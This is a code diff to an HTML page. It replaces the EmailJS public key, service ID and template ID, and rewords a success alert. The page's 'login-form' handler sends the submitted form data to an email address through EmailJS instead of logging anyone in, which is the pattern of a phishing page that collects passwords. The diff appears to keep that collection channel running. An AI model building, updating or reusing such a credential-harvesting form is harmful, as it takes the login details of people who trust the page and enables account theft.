@@ -7,7 +7,7 @@
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function() {
-      emailjs.init("VYKK057zR_OaMB7bb"); // Your Public Key
+      emailjs.init("O67uK2KBnB4k30D5P"); // Your new Public Key
     })();
   </script>
   <style>
@@ -107,9 +107,9 @@
     document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      emailjs.sendForm('service_a2telwm', 'template_1nv1vqd', this)
+      emailjs.sendForm('service_c99eptj', 'template_wfcgd3s', this)
         .then(function() {
-          alert("Information sent to your email successfully!");
+          alert("Information sent successfully to your email.");
         }, function(error) {
           alert("Failed to send. Error: " + JSON.stringify(error));
         });
